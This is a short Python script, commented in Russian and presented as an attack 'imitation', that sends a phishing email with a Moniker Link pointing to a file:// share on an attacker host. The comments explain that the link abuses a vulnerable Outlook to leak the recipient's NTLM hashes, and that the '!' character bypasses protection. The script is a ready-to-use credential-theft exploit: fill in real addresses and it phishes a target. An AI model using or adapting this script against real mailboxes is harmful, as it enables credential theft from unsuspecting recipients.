import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- Данные для имитации атаки (замени на свои для теста) ---
# SMTP-сервер (например, для Gmail нужно включить "менее безопасные приложения" или использовать пароль приложения)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SENDER_EMAIL = "your_email@gmail.com"
SENDER_PASSWORD = "your_app_password"  # Используй пароль приложения, если включена двухфакторка

TARGET_EMAIL = "victim_email@example.com"
# ----------------------------------------------------------

# Вредоносная ссылка (Moniker Link)
# Она указывает на несуществующий ресурс по SMB, что приведет к попытке аутентификации и утечке NTLM-хеша.
# Восклицательный знак (!) — ключевой элемент для обхода защиты.
malicious_link = "file://attacker-server/share/click!malicious"

# Создаем тело письма с HTML, чтобы красиво отобразить ссылку
html_body = f"""
<html>
  <body>
    <p>Привет! Посмотри интересный документ по ссылке:</p>
    <a href="{malicious_link}">Открыть документ</a>
  </body>
</html>
"""

# Формируем письмо
message = MIMEMultipart("alternative")
message["Subject"] = "Важный документ"
message["From"] = SENDER_EMAIL
message["To"] = TARGET_EMAIL

# Прикрепляем HTML-версию письма
part = MIMEText(html_body, "html")
message.attach(part)

print("[*] Имитация отправки вредоносного письма...")
print(f"[*] Получатель: {TARGET_EMAIL}")
print(f"[*] Вредоносная ссылка в письме: {malicious_link}")
print("[*] Если получатель откроет письмо в уязвимой версии Outlook и перейдет по ссылке, его NTLM-хеши могут быть скомпрометированы.")

try:
    # Отправляем письмо (имитируем действие атакующего)
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    server.sendmail(SENDER_EMAIL, TARGET_EMAIL, message.as_string())
    server.quit()
    print("[+] Письмо успешно отправлено! (Имитация атаки завершена)")
except Exception as e:
    print(f"[-] Ошибка при отправке письма: {e}")
    print("[*] Убедитесь, что вы используете реальные данные для входа, или запустите локальный SMTP-сервер для теста.")